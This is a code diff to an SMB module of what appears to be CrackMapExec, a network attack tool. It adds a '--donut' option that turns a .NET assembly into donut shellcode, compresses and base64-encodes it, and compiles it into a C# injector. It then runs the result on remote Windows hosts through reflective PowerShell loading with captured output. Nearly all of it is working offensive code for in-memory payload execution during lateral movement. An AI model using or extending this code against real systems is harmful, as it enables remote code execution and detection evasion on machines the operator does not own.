@@ -207,6 +207,8 @@ class smb(connection):
         cgroup.add_argument('--dotnetassembly', action='store_true', help='execute a .NET assembly treating the first part of the command as the assembly name')
         cgroup.add_argument('--dotnetassembly-names', help='a comma-separated string of Namespace,Class,Method to execute')
         cgroup.add_argument('--dotnetassembly-arg-type', default='array', choices={'array', 'string'}, help='pass the arguments as an array or as a string')
+        cgroup.add_argument('--donut', action='store_true', help='when using the --dotnetassembly option, convert the binary to a donut shellcode first '
+                                                                 '(donut should be in PATH as well as mono-devel should be installed)')
         cgroup.add_argument('--force-ps32', action='store_true', help='force the PowerShell command to run in a 32-bit process')
         cgroup.add_argument('--no-output', action='store_true', help='do not retrieve command output')
         cegroup = cgroup.add_mutually_exclusive_group()
@@ -614,12 +616,42 @@ class smb(connection):
                     self.put_file()
 
             payload_file_path = Path(payload.split()[0])
+            payload_args = ' '.join(payload.split()[1:])
+
+            if self.args.donut:
+                donut_shellcode_path = f'/tmp/{gen_random_string(6)}.bin'
+                donut_cmd = f'donut -i {payload_file_path} -b1 -t -p "{payload_args}" -o {donut_shellcode_path}'
+
+                self.logger.highlight(donut_cmd)
+                os.system(f'{donut_cmd} > /dev/null')
+
+                with open(donut_shellcode_path, 'rb') as f:
+                    deflate_stream = zlib.compressobj(zlib.Z_DEFAULT_COMPRESSION, zlib.DEFLATED, -15)
+                    donut_shellcode_compressed = deflate_stream.compress(f.read())
+                    donut_shellcode_compressed += deflate_stream.flush()
+                donut_shellcode_compressed_b64 = base64.b64encode(donut_shellcode_compressed).decode()
+                os.remove(donut_shellcode_path)
+
+                with open(os.path.join(os.path.expanduser('~/.cme'), 'donut_template.cs'), 'r', encoding='utf-8-sig') as f:
+                    template = f.read()
+
+                template = template.replace('DONUT', donut_shellcode_compressed_b64)
+                template = template.replace('NAMESPACE', f'{payload_file_path.stem}Inject')
+                with tempfile.NamedTemporaryFile('w') as tmp:
+                    payload_file_path = Path(f'/tmp/{payload_file_path.stem}Inject.exe')
+                    tmp.write(template)
+                    mono_csc_cmd = f'mono-csc /t:exe /platform:x64 /out:{payload_file_path} {tmp.name}'
+                    self.logger.highlight(mono_csc_cmd)
+                    os.system(f'{mono_csc_cmd} > /dev/null')
+
             with open(payload_file_path, 'rb') as f:
                 deflate_stream = zlib.compressobj(zlib.Z_DEFAULT_COMPRESSION, zlib.DEFLATED, -15)
                 payload_file_compressed = deflate_stream.compress(f.read())
                 payload_file_compressed += deflate_stream.flush()
             payload_file_compressed_b64 = base64.b64encode(payload_file_compressed).decode()
-            payload_args = ' '.join(payload.split()[1:])
+
+            if self.args.donut:
+                os.remove(payload_file_path)
 
             with tempfile.NamedTemporaryFile('w') as tmp:
                 payload_file_remote_path = f'\\Windows\\Temp\\{gen_random_string(6)}'
@@ -657,7 +689,24 @@ class smb(connection):
                     $g = [Reflection.BindingFlags]"Public,NonPublic,Static"
                     $h = $f.GetType("{dotnetassembly_namespace}.{dotnetassembly_class}", $g)
                     $i = $h.GetMethod("{dotnetassembly_method}", $g)
-                    $i.Invoke($null, (, '{payload_args}'{dotnetassembly_arg_type}))
+                    $j = [System.Console]::Out
+                    $k = New-Object System.IO.StringWriter
+                    [System.Console]::SetOut($k)
+                    '''
+
+                if self.args.donut:
+                    ps_payload += f'''\
+                        $i.Invoke($null, $null)
+                        '''
+                else:
+                    ps_payload += f'''\
+                        $i.Invoke($null, (, '{payload_args}'{dotnetassembly_arg_type}))
+                        '''
+                
+                ps_payload += f'''\
+                    [System.Console]::SetOut($j)
+                    $l = $k.ToString()
+                    $l
                     '''
             elif self.args.powershell:
                 ps_payload += f'''\
